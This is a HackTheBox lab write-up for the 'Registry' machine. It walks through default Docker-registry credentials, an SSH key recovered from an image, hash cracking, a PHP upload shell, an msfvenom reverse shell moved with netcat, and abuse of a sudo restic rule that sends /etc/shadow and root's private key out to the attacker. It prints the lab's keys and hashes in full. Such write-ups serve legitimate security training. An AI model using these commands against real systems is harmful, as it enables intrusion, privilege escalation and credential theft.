---
title: "HTB: Registry"
categories:
  - HackTheBox
tags:
  - HackTheBox
---

![Registry](https://i.ibb.co/wBf0KtD/Capture.png)

## Nmap Scan

```
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCZtxPox0F/6ZQbPbgwP9t13ZX+DegufV+sVoqTGWfuE2/jQwVLR+TCLJM4EDg4UJol4OHl0ATQBkPM7CSi1DS3oZgNlaASXQoZFzHUN4KF1/B6uShfMcszORHOBSRZAMe5nuesre2oJtrqhyO1VS2TMOitFLmKEaDImHy7EXe8qnaK8CrVFAxdUOG8iQFEiZUt8JZJ6CPgfIu00t4JpIl9l4aOFEZT6H7xf7K74ov2KNyP6WCoOtdDf7Rhfwcfo6dogHxssH6O/d+FgN6KJ8q2gJjUZVYYjZHTfGCPRukmSDYQNglQkvzuOy3umUTwNt5NdjYBT+vemcOIaDPm0SX
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDFZI3tSfqp1WJF1TjoPa3J6j94yzXZMtFj92P8HcBUXCosmhsTsRa5rBvt20Es/qTp2otqYz3R3jf9O0OGC/tc=
|   256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINNAMP4YFJGAx3ip1MPEsDuXUhgHXOIxrVTUCOxqJeRr
80/tcp  open  http     syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Issuer: commonName=Registry
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
| SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
| -----BEGIN CERTIFICATE-----
| MIICrTCCAZUCCQDjC7Es6pyC3TANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAhS
| ZWdpc3RyeTAeFw0xOTA1MDYyMTE0MzVaFw0yOTA1MDMyMTE0MzVaMB4xHDAaBgNV
| BAMME2RvY2tlci5yZWdpc3RyeS5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDAQd6mLhCheVIu0IOf2QIXH4UZGnzIrcQgDfTelpc3E4QxH0nq+KPg
| 7gsPuMz/WMnmZUh3dLKLXb7hqJ2Wk8vQM6tt+PbKna/D6WKXqGM3JnSLKW1YOkIu
| AuQenMOxJxh41IA0+3FqdlEdtaOV8sP+bgFB/uG2NDfPOLciJMop+d5pwpcxro8l
| egZASYNM3AbZjWAotmMqHwjGwZwqqxXxn61DixNDN2GWLQHO7QPUVUjF+Npso3zN
| ZLUJ1vkAtl6kFlmLTJgjlTUuE78udKD5r/NLqHNxxxObaSFXrmm2maDDoAkhobOt
| ljpa/U/fCv8g03KToaXVZYb6BfFEP5FBAgMBAAEwDQYJKoZIhvcNAQELBQADggEB
| AF3zSdj6GB3UYb431GRyTe32Th3QgpbXsQXA2qaLjI0n3qOF5PYnADgKsDzTxtDU
| z4e5vLz0Y3NhMKobft+vzBt2GbJIzo8DbmDBD3z1WQU+GLTnXyUAPF9J6fhtUgKm
| hoq1S8YsKRt/NMJwZMk3GiIw1c7KEN3/9XqJ9lfIyeXqVc6XBvuiZ+ssjDId0RZO
| 7eWWELxItMHPVScwWpOA7B4INPM6USKGy7hUTFcPJZB7+ElTFO2h0c4MwFQcSqKW
| BUG+oUPpMOoO99ZRnX8D5/H3dvbuBsuqKgRrPmQnMehoWs7pNRUDudUnnLfGEJHh
| PEyspHOCbg1C6a0gI1xo0c0=
|_-----END CERTIFICATE-----
```

## Checking the Docker Image

http://docker.registry.htb/v2/_catalog has the reposity bolt-image in it. This is the HTTP v2 API for docker.

nikto -ask=no -h http://docker.registry.htb 2>&1 gathers more information.

**admin:admin** are the credentials.

## Installing Docker

```
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
sudo apt-get update 
sudo apt-get install docker-ce
sudo systemctl start docker
```

## Setting Up the .crt

We first need to grab the cert from Firefox, by visiting https://docker.registry.htb/ -> click the lock icon -> click connection -> click more information -> click view certificate -> click details -> click export 

From here, we need to move the ca.crt file to our docker path:

```
sudo cd /etc/docker
sudo mkdir certs.d
sudo cd certs.d
sudo mkdir docker.registry.htb:443
sudo cp ~/HTB/Registry/ca.crt /etc/docker/certs.d/docker.registry.htb:443/
```

## Cloning the Image

We can now restart docker and connect to the remote docker registry:

```
sudo service docker restart
sudo docker login -u admin docker.registry.htb:443 
Password: admin
```

To clone the image:

```
sudo docker pull docker.registry.htb:443/bolt-image --disable-content-trust -a
```

This will download the docker image, verify the checksum for each part and save each part locally.

## Searching the Docker Image

In /var/lib/docker, we can run the following:

sudo grep -lr ssh

We see:

_randomnumbers_/diff/root/.ssh

Going into this folder gives us an id_rsa key:

```
-----BEGIN RSA PRIVATE KEY-----                                    
Proc-Type: 4,ENCRYPTED                                                                                                                
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9                                                                                
                                                                                                                                      
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
Bdtfi9goJBFb6P7yHapZ13W30b96ZQG4Gdf4ZeV6MPMizcTbiggZRBokZLCBMb5H
pgkPgTrGJlbm+sLu/kt4jgex3T/NWwXHVrny5kIuTbbv1fXfyfkPqU66eysstO2s
OxciNk4W41o9YqHHYM9D/uL6xMqO3K/LTYUI+LcCK13pkjP7/zH+bqiClfNt0D2B
Xg6OWYK7E/DTqX+7zqNQp726sDAYKqQNpwgHldyDhOG3i8o66mLj3xODHQzBvwKR
bJ7jrLPW+AmQwo/V8ElNFPyP6oZBEdoNVn/plMDAi0ZzBHJc7hJ0JuHnMggWFXBM
PjxG/w4c8XV/Y2WavafEjT7hHuviSo6phoED5Zb3Iu+BU+qoEaNM/LntDwBXNEVu
Z0pIXd5Q2EloUZDXoeyMCqO/NkcIFkx+//BDddVTFmfw21v2Y8fZ2rivF/8CeXXZ
ot6kFb4G6gcxGpqSZKY7IHSp49I4kFsC7+tx7LU5/wqC9vZfuds/TM7Z+uECPOYI
f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9
RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V
94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr
-----END RSA PRIVATE KEY-----     
```

We also see:

_randomnumbers_/diff/etc/profile.d/01-ssh.sh

This gives us a password for the id_rsa key:

**GkOcz221Ftb3ugog**

We can now chmod 600 the key and use it to connect:

```
chmod 600 id_rsa
ssh -i id_rsa bolt@registry.htb
Password: GkOcz221Ftb3ugog
```

## Enumeration

At http://backup.registry.htb/bolt/bolt we're presented with a login page.

In /var/www/html/bolt/app/database/bolt.db, we get the following hash:

```
admin:$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
```

We can crack this with hashcat:

```
hashcat -m 3200 wwwpass.txt /usr/share/wordlists/rockyou.txt
```

We get the following credentials:

**admin:strawberry**

We can use these credentials to log into the website!

## Pivoting to www-data

We can exploit the file upload feature on the website, since we have admin access. However, we need to edit a config.yml file first, and find exactly where the files are being stored, as the website is somewhat broken.

### Editing the config.yml File

There's a config.yml file on the machine that dictates what extensions are allowed to be uploaded. It can be edited at the following URL:

http://backup.registry.htb/bolt/bolt/file/edit/config/config.yml

Adding php to the list of allowed extensions allows us to upload a php shell. However, this config.yml file is reverted after 10 or so seconds, so we'll need to keep this window open for now.

### Uploading our Shell

Now that we've allowed php extensions, we can upload a php shell at http://backup.registry.htb/bolt/bolt/files

As mentioned earlier, we'll need to be quick in uploading this file, as the config.yml file reverts regularly. To add to the difficulty, whatever php shell we upload will disappear within 15 to 20 seconds.

### Executing our Shell

We can call our shell at the following URL:

http://backup.registry.htb/bolt/files/shell.php

However, we don't receive a connection back. This is because the machine can't make any connections outside of its localhost (it can only accept connections originating externally.) However, because it can receive connections originating from its localhost, we can still exploit this vulnerability.

### Creating a Shell

We'll use msfvenom to create our shell:

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > shell.elf
```

To upload the shell, we'll need to use netcat, as we can't wget it, since the machine can't make any outgoing external connections:

_On the victim machine:_
```
nc -nlvp 4444 > shell.elf
```
_On our attacking machine:_
```
nc -nv 10.10.10.159 4444 < shell.elf
```

We now need to allow www-data to run the shell:

```
chmod 777 shell.elf
```

Now, with our shell in place, we can set up a nc listener on the victim machine to catch it locally:

```
nc -nlvp 4444
```

Using the following php shell payload, we are able to execute the shell as www-data:

```
<?php 
        echo system('/var/tmp/shell.elf');      
?>
```

With the php extensions allowed in config.yml, and the php shell in place, we can visit the URL and execute the shell:

http://backup.registry.htb/bolt/files/shell.php

```
whoami
www-data
``` 

Voila, www-data shell!

To spruce up the shell a bit, we can import TTY:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Further Enumeration as www-data

Running sudo -l gives us the following:

```
User www-data may run the following commands on bolt:                                                                │Last login: Wed Mar  4 16:25:07 2020 from 10.10.14.26
    (root) NOPASSWD: /usr/bin/restic backup -r rest*  
```

It *appears* as if we'll need to create a rest server on our attacking machine:

https://github.com/restic/rest-server/releases

We can just download one of the releases, unzip it with gzip, and run it:

```
./rest-server-0.9.7-linux-amd64
```

Now, we can forward our local port to the victim machine, since it can't make outgoing connections:

```
ssh -R 1234:127.0.0.1:8000 -i id_rsa bolt@registry.htb
```

Now, we need to initialize the repo on the victim machine:

```
restic -r rest:http://127.0.0.1:1234/ init 
```

Now, we just backup an important file:

```
sudo restic backup -r rest:http://127.0.0.1:1234/ /etc/shadow  
```

This saves the backup on our attacking machine, under the /tmp/restic folder, so we can restore the backup on our attacking machine. First, we need to find the ID of the snapshot that's been saved:

```
restic -r /tmp/restic snapshots
```

We get:

```
repository 9c85fcf4 opened successfully, password is correct
ID        Time                 Host        Tags        Paths
---------------------------------------------------------------------
e88d1a35  2020-03-04 13:49:33  bolt                    /etc/shadow
---------------------------------------------------------------------
```

We can now restore this ID:

```
restic -r /tmp/restic restore e88d1a35 --target /tmp/restore 
```

This gives us a nice list of hashes!

```
root:$6$tBgQhcnm$9LkMBpvqFk8yk2WbvQYSiZdvA6k0w3b3lfcdJzTE5BrGm5b/IyEfFD5HskZ3Z35yhrj9hbyrhbFELzzQa5ldP0:18044:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17893:0:99999:7:::
uuidd:*:17893:0:99999:7:::
dnsmasq:*:17893:0:99999:7:::
landscape:*:17893:0:99999:7:::
pollinate:*:17893:0:99999:7:::
statd:*:17893:0:99999:7:::
sshd:*:17893:0:99999:7:::
bolt:$6$MbEsG45E$GwigsJKeDuECWa.fnc5yfN0ahJOYYU9RuQ044xQlmt7blReerywj4EQoVyrElU1XgUzqunQ5ZAPoL1/V7KRXG1:18044:0:99999:7:::
vboxadd:!:18044::::::
git:$6$u.ix2wsI$11gn1OZX8UIFodXK.egLdYBI7e7tvsOjJa2Nc98SbZOcqISdUwWFzeJAliORbhL8dVOtHh2BN3sTix.jGpsI21:18177:0:99999:7:::
```

Of course, we can also do this with the root flag. Even better, we can grab root's id_rsa ssh key:

```
sudo restic backup -r rest:http://127.0.0.1:1234/ /root/.ssh/id_rsa 
```

Now, we can use the same method to extract it:

```
restic -r /tmp/restic/snapshots
ID        Time                 Host        Tags        Paths
------------------------------------------------------------------------
e88d1a35  2020-03-04 13:49:33  bolt                    /etc/shadow            
39461c2b  2020-03-04 13:58:12  bolt                    /root/root.txt       
525bab2c  2020-03-04 14:03:15  bolt                    /root/.ssh/id_rsa    
------------------------------------------------------------------------
3 snapshots     

restic -r /tmp/restic restore 525bab2c --target /tmp/restore

cat id_rsa
-----BEGIN RSA PRIVATE KEY-----                                                                                      
MIIEowIBAAKCAQEAmiGiXpswTyHhjgC55jHRWlGX1asEMyDFfkVwhuNohv/4cQKm     
cJB/3psQocosq+GMh9Y/uRPUgMcDnrTaNYOdkPS+QLd8vcFKSwSewH1w4/AYLuci
4k71qYsJlkcS2Pb0PqEcpodmXf4OBdTCiCCnjgGhOcvPpKMSCb1vy2Yo+A+eHzKp
1S48LgJRLKU1sGe0KE4MC8g7qpF7NSKOCW69z5KaoopQA3jPxnW17WE9PdGZQvqX
4/Mf9DGdeUrejRlX0BI2EGiZhPKwwKxqIHLRpw4pR4+OjR1sOkAA7UWtMYn/3cs+       
IS3L75/i5Qsr0cMCtZ/hQAKtjpPoCCe1qHp7CQIDAQABAoIBAFlvYtQaoLGKK2NG         
sJgOGDicV8o37bvtLCvVBzJ+Ck0rgnGw4/s1Hb2BpOj8c2dY/T5k55zxEMGYuVUC
BAxBTtCp8yuCTPOekQluqN9w6myZCK9Ol0NSJeI3N1zn6NvUkG0293T55EBuBp0D
k82BhTg1YeQzi00xAmp8bb5MjUFCiCbSFH1MMpY/9itg1b3mqx7UlyDldMM9UdKH          
HS9aZmAzY5/U6wEtJi4mx3QIoVahytMgcxd7qoicCYyVm73HFQsZ58L+5QflygH4            
dpbptPOnNmLUkWFXcK3bmlmrEyuafS6z68oDFeAZz8Dg2D2qXWfhdlN4GVstlxSI    
skH5sAECgYEAySOp7KOZJVpstF8zjn+/OZowEF4iSHnaGAX64B6GgWwXQURn3wVq     
tlqDO5m5vIexe2tyFDSVe5otWtzQvbPNkjpD7/kglGTbT9PCU/Dgb5pTmOxBPi9a
1W8+q7lwiXLIRb4NB+BqDz0yI924BnZt9rukzm9650Rrbala0HZxhIECgYEAxCux
RQUzgSx7YdzThvB8sAzQJj2gNAbwEA9Y56I0pQLvTNoGQY8V8IYBrlvW935kLfcf
xz8j5VNt1BizDQjG8j5FfVcU6VE98/OMgn4XKd6nl9sOoQBXzssjUF+3AIhn5DsK
Q/IymTZEmhfGAt9k6dE4WH8qffea/E7qJY+pkokCgYAdatLiYjb2yJfXdYkD0Vk1
YoCfFDVtZizokI9VkgFYEmgASrHqY09tJiXFZMFOeoYRp/BCVkJ6ll0Fyf/Zjt+F
AHKJOWVzbqDItw7X2gXpLKgHWJ5eKuzdBG0lDnUQFTKHSLl9Kmw4mFmp9zZ/83g3
us/qxVEzW8Vef4Nhs8D8gQKBgDtsMMqDhNKAMu+2AK1Dc8GwX+z1he28nEOBIqEn
1WKWvP4+nN6HBVJShXfXggp+UsJJtWqZiboRx5cT1EkCe6Etk8cf9cmnPmkDQXDV
2RZpx8KMLKZAgFi31/6kv759k1rjN3zVhNY8RhOXV/fOy7a4FaVY//ogYuZC0VKH          
bgphAoGBAKGyJQe/b6rUkpzvIBxbGt9Hw1kpLr07VCdPQb1MCdCU4l+mlDD5NBN3            
mzygp6MTi+TvN3PhxlfAmUPbz0qw+3aX95pt2cQ492wLOe+RsVsKtvDTgH/2+DUe           
2qnb+Jd6ERs3jmBeuuavC2O5ajhyLt1xL3uF5UVpoenCYlYuOvL4                                                                 
-----END RSA PRIVATE KEY-----  
```

Now, we can just ssh in with it:

```
ssh -i id_rsa root@registry.htb

root@bolt:~# whoami                                                                                                  
root  
```



